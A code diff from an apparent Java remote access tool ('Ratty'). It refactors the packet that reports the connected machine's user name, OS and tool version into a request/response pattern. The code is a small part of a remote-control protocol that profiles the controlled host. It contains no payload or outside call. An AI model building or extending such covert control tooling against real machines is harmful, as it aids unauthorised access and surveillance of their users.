@@ -3,14 +3,9 @@ package de.sogomn.rat.packet;
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.Ratty;
 
-public final class InformationPacket implements IPacket {
+public final class InformationPacket extends AbstractPingPongPacket {
 	
 	private String name, os, version;
-	
-	private byte type;
-	
-	private static final byte REQUEST = 0;
-	private static final byte DATA = 1;
 	
 	public InformationPacket(final String name, final String os, final String version) {
 		this.name = name;
@@ -27,30 +22,42 @@ public final class InformationPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	protected void sendRequest(final ActiveClient client) {
+		//...
+	}
+	
+	@Override
+	protected void sendData(final ActiveClient client) {
 		client.writeUTF(name);
 		client.writeUTF(os);
 		client.writeUTF(version);
-		client.writeByte(type);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	protected void receiveRequest(final ActiveClient client) {
+		//...
+	}
+	
+	@Override
+	protected void receiveData(final ActiveClient client) {
 		name = client.readUTF();
 		os = client.readUTF();
 		version = client.readUTF();
-		type = client.readByte();
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
-		if (type == REQUEST) {
-			final String name = System.getProperty("user.name");
-			final String os = System.getProperty("os.name");
-			final InformationPacket packet = new InformationPacket(name, os, Ratty.VERSION);
-			
-			client.addPacket(packet);
-		}
+	protected void executeRequest(final ActiveClient client) {
+		type = DATA;
+		name = System.getProperty("user.name");
+		os = System.getProperty("os.name");
+		version = Ratty.VERSION;
+		
+		client.addPacket(this);
+	}
+	
+	@Override
+	protected void executeData(final ActiveClient client) {
+		//...
 	}
 	
 	public String getName() {
